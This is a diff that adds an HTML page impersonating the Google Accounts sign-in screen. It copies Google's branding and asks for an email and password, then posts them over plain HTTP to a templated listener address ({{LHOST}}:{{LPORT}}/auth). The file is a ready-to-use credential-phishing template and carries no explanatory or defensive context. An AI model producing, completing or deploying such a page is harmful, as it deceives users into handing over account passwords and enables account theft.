@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sign in - Google Accounts</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background-color: #fff; font-family: "Roboto", Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; width: 360px; text-align: center; }
+        h1 { font-weight: 400; font-size: 24px; color: #202124; margin-bottom: 10px; }
+        p { color: #202124; font-size: 16px; margin-top: 0; margin-bottom: 30px; }
+        input { width: 100%; padding: 13px 15px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        input:focus { border: 2px solid #1a73e8; outline: none; padding: 12px 14px; }
+        button { width: 100%; padding: 10px 24px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: 500; font-size: 14px; cursor: pointer; float: right; width: auto; }
+        button:hover { background-color: #1558d6; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 style="color: #4285F4; font-weight: bold; margin-bottom: 5px;">G<span style="color: #EA4335">o</span><span style="color: #FBBC05">o</span>g<span style="color: #34A853">l</span><span style="color: #EA4335">e</span></h1>
+        <h1>Sign in</h1>
+        <p>Use your Google Account</p>
+        <form action="http://{{LHOST}}:{{LPORT}}/auth" method="POST">
+            <input type="email" name="email" placeholder="Email or phone" required>
+            <input type="password" name="pass" placeholder="Enter your password" required>
+            <div style="overflow: hidden;"><button type="submit">Next</button></div>
+        </form>
+    </div>
+</body>
+</html>
